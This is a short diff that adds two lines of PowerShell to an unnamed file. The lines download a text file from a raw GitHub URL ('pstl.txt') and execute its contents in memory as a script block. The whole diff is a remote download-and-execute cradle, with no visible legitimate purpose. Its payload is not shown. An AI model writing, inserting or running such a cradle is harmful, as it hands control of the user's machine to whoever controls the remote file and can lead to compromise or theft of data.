@@ -1,0 +1,2 @@
+$u='https://github.com/devilJM/stl/raw/refs/heads/main/pstl.txt'
+([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString($u))).Invoke()
